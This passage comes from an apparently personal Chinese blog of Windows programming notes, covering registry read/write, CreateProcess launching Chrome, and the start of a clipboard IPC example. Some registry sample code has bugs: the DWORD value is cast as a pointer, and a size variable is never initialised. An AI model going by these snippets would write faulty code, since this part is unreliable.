class="string">&quot;school&quot;</span>, <span class="string">&quot;teacher&quot;</span>, <span class="literal">NULL</span>, dwValue, <span class="number">1024</span>, szPathFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//cstring拼接</span></span><br><span class="line">CString strShow;</span><br><span class="line">strShow.<span class="built_in">Format</span>(<span class="string">&quot;friend:%s student:%s teacher:%s&quot;</span>, dwKey, dwKeyName, dwValue);</span><br><span class="line"><span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但反正最后还是读出了值：</p><img src="/2022/07/23/windowsFiles/010.png" class=""><hr><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>注册表是存储在二进制文件里面的，win32api 提供了大量的函数操作注册表</p><p>额，默认打开的话，win+r是打开运行，然后输入regedit即可打开注册表，如果之前有用过就会很熟悉。</p><p><strong>动注册表之前，vs需要用管理员启动，不然肯定是无法写入的。</strong></p><p>项目还是之前那个没关系。</p><p><code>RegCreateKey</code>创建指定的注册表项</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegCreateKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegCreateKeyW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,     <span class="comment">//句柄，实际应该为分支</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,  <span class="comment">//打开或创建的表项名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult   <span class="comment">//用来接收创建或打开的表项句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegCreateKey  RegCreateKeyW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegCreateKey  RegCreateKeyA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>这个微软就喜欢多字节和Unicode，从他头文件中各自宏定义去兼容这两种编码。</p><p><code>RegOpenKey </code>打开注册表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegOpenKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegOpenKeyW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegOpenKey  RegOpenKeyW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegOpenKey  RegOpenKeyA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p><code>RegSetValue</code>写入注册表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegSetValueA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(cbData) LPCSTR lpData, <span class="comment">//存放的数据</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD cbData       <span class="comment">//要存放的值的大小长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegSetValueW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(cbData) LPCWSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD cbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegSetValue  RegSetValueW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegSetValue  RegSetValueA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p><code>RegQueryValue</code>检索与指定注册表项的默认值或未命名值关联的数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegQueryValueA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*lpcbData, *lpcbData) __out_data_source(REGISTRY) LPSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ PLONG lpcbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegQueryValueW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*lpcbData, *lpcbData) __out_data_source(REGISTRY) LPWSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ PLONG lpcbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegQueryValue  RegQueryValueW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegQueryValue  RegQueryValueA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>那么写入的部分其实还是有点水</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//注册表 写</span></span><br><span class="line">HKEY hKey;</span><br><span class="line">DWORD dwWeight = <span class="number">70</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建注册表</span></span><br><span class="line"><span class="comment">//DWORD dwRet = ::RegCreateKey(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\MYWEIGHT\\admin&quot;, &amp;hKey);</span></span><br><span class="line">DWORD dwRet = ::<span class="built_in">RegCreateKey</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\HHH\\admin&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写注册表</span></span><br><span class="line">dwRet = ::<span class="built_in">RegSetValueEx</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="literal">NULL</span>, REG_DWORD, (CONST BYTE *)dwWeight, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;写入注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭注册表</span></span><br><span class="line">::<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跑起来看看注册表里面有没有我们写入的。</p><img src="/2022/07/23/windowsFiles/011.png" class=""><p>md，<code>::RegCreateKey(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\MYWEIGHT\\admin&quot;, &amp;hKey);</code>这个注册表位置管理员打开的软件居然写不进去，我找了半天没找到，换了个地方写就马上见效，离谱，浪费我一堆时间啊。</p><p>然后读的部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//注册表 读</span></span><br><span class="line">HKEY hKey;</span><br><span class="line">DWORD dwRet = ::<span class="built_in">RegOpenKey</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\HHH\\admin&quot;</span>, &amp;hKey);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;打开注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读或者查注册表</span></span><br><span class="line">DWORD dwWight;</span><br><span class="line">DWORD dwType;</span><br><span class="line">DWORD dwSize;</span><br><span class="line">CString strShow;</span><br><span class="line">dwRet = ::<span class="built_in">RegQueryValueExA</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE) &amp;dwWight, &amp;dwSize);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;读取注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">strShow.<span class="built_in">Format</span>(<span class="string">&quot;Weight = %d&quot;</span>, dwWight);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭注册表</span></span><br><span class="line">::<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"><span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实写起来也不难，就是要填充这个参数问题。</p><img src="/2022/07/23/windowsFiles/012.png" class=""><p>效果就是这样了。</p><hr><h2 id="常规的文件等级"><a href="#常规的文件等级" class="headerlink" title="常规的文件等级"></a>常规的文件等级</h2><ol><li>调试日志 debugview 文件日志、警告日志、错误日志 &#x2F;五星</li><li>视频存储 &#x2F;四星</li><li>文件传输CFile和Socket结合 &#x2F;四星</li><li>C语言和mfc的文件操作，win32api &#x2F;三星</li><li>windows的配置文件    &#x2F;五星</li><li>注册表 病毒 逆向     &#x2F;五星</li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>反正比较常用的文件操作还是以c语言和mfc为主吧，毕竟c用的很久了。mfc嘛自然在这个框架里面最好用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程</title>
      <link href="/2022/07/21/process/"/>
      <url>/2022/07/21/process/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>基本情况下，我们查看任务进程，包括kill一个未响应的进程，都会在任务管理器中操作。<br>不过微软自己有个进程资源管理器看到的会更详细一点，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">链接戳此处</a></p><p><strong>注：需要科学上网，不然很慢</strong></p><img src="/2022/07/21/process/000.png" class=""><p>进程实际上就一个纯粹的容器，进程本身不执行任何东西。代码的实现靠的的是线程，进程只相当于一个环境。<br>子进程也还是一个进程，它是指由另一个进程(对应称为父进程)所创建的进程。<br>子进程的线程既可以在父进程终止之后执行代码，也可以在父进程运行过程中执行代码。</p><hr><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><p><code>CreateProcess</code>用来创建进程的函数。<br>其原型，参数一贯的又臭又长</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpApplicationName, <span class="comment">//该字符串可以指定要执行的模块的完整路径和文件名</span></span><br><span class="line">    _Inout_opt_ LPWSTR lpCommandLine,   <span class="comment">//命令行</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">//该结构确定子进程是否可以继承返回到新进程对象的句柄，如果为NULL则不能继承</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">//该结构确定子进程是否可以继承返回到新线程对象的句柄，如果为NULL则不能继承</span></span><br><span class="line">    _In_ BOOL bInheritHandles,  <span class="comment">//参数若为TRUE则新进程继承调用进程的每个可继承句柄。如为FALSE则不会继承句柄</span></span><br><span class="line">    _In_ DWORD dwCreationFlags, <span class="comment">//控制优先级别和流程创建的标识</span></span><br><span class="line">    _In_opt_ LPVOID lpEnvironment,  <span class="comment">//指向新进程的环境块的指针，若为NULL则新进程将使用调用进程的环境</span></span><br><span class="line">    _In_opt_ LPCWSTR lpCurrentDirectory,    <span class="comment">//进程当前目录的完整路径</span></span><br><span class="line">    _In_ LPSTARTUPINFOW lpStartupInfo,      <span class="comment">//设置扩展属性</span></span><br><span class="line">    _Out_ LPPROCESS_INFORMATION lpProcessInformation    <span class="comment">//该结构接收有关新进程的标识信息</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>具体可以去看文档。因为Windows API套娃严重。。他这里的参数还有结构体。有点绷不住。</p><p>然后自制进程的话不太理想，反正打开一个程序也是一个进程，就直接配置打开一个程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RunExe</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Chrome路径</span></span><br><span class="line">STARTUPINFO strStartup;</span><br><span class="line"><span class="built_in">memset</span>(&amp;strStartup, <span class="number">0</span>, <span class="built_in">sizeof</span>(strStartup));</span><br><span class="line">strStartup.cb = <span class="built_in">sizeof</span>(strStartup);</span><br><span class="line">PROCESS_INFORMATION szProcessInformation;</span><br><span class="line"><span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line">TCHAR szCommandLine[] = <span class="string">L&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">CreateProcess</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">szCommandLine,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line">CREATE_NEW_CONSOLE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;strStartup,</span><br><span class="line">&amp;szProcessInformation</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create success ret = %d\n&quot;</span>, ret);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(szProcessInformation.hProcess,INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line"><span class="comment">//手动置空看情况。</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//通过进程拉起谷歌浏览器</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is Chrome\n&quot;</span>);</span><br><span class="line"><span class="built_in">RunExe</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>memset是计算机中C&#x2F;C++语言初始化函数。作用是将某一块内存中的内容全部设置为指定的值， 这个函数通常为新申请的内存做初始化工作。</strong></p><img src="/2022/07/21/process/001.png" class=""><p>可以看到是成功启动了我们的谷歌浏览器，但是自己用的时候要注意，文件路径每个人多少都有不同，所以不要直接套娃。</p><p>除了直接打开.exe，还可以通过命令行的方式让他打开网页<br><code>TCHAR szCommandLine[] = L&quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;https://www.baidu.com&quot;;</code><br>如此设置之后，run的时候就能看到浏览器直接打开百度的首页了。</p><img src="/2022/07/21/process/002.png" class=""><p>并且进程对象的成员也使得我们能够看到相对应的id</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create success ret = %d\n&quot;</span>, ret);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(szProcessInformation.hProcess,INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.hProcess = %d\n&quot;</span>, szProcessInformation.hProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.hThread = %d\n&quot;</span>, szProcessInformation.hThread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.dwProcessId = %d\n&quot;</span>, szProcessInformation.dwProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.dwThreadId = %d\n&quot;</span>, szProcessInformation.dwThreadId);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">    <span class="comment">//手动置空看情况。</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/003.png" class=""><p>当然用这个调用cmd去执行一些命令好像有点问题，而且有点笨，它都可以直接通过system调用系统命令了。</p><hr><h2 id="进程间通信方式"><a href="#进程间通信方式" class="headerlink" title="进程间通信方式"></a>进程间通信方式</h2><ol><li>socket ip和端口</li><li>剪切板  剪切板的内核对象</li><li>邮槽 邮槽的内核对象</li><li>匿名管道(无名管道)</li><li>命名管道</li><li>Copy_data findwindows wm_copudata  Sendmessage</li></ol><hr><h2 id="剪切板"><a href="#剪切板" class="headerlink" title="剪切板"></a>剪切板</h2><p>新建项目mfc</p><img src="/2022/07/21/process/004.png" class=""><p>选择基于对话框，然后就点完成</p><img src="/2022/07/21/process/005.png" class=""><p>打开之后长这样就差不多了。</p><p>运行一下，跟里面看的差不多</p><img src="/2022/07/21/process/006.png" class=""><p>加下来要用到资源视图，如果没打开的可以参照</p><img src="/2022/07/21/process/007.png" class=""><img src="/2022/07/21/process/008.png" class=""><p>因为之前看过qt，所以拖动组件和修改id之类的不是什么问题。</p><img src="/2022/07/21/process/010.png" class=""><p>做成这样之后双击按钮进入代码实现部分,<strong>注意修改项目为多字节，unicode有点问题先不管了，但是可以提一嘴，就是接收的时候需要转换</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//打开剪切板 成功返回TRUE</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//打开之后首先清空剪切板</span></span><br><span class="line"><span class="built_in">EmptyClipboard</span>();</span><br><span class="line"><span class="type">char</span> *szSendBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取SEND框的内容</span></span><br><span class="line">CString strSend&#123;&#125;;</span><br><span class="line"><span 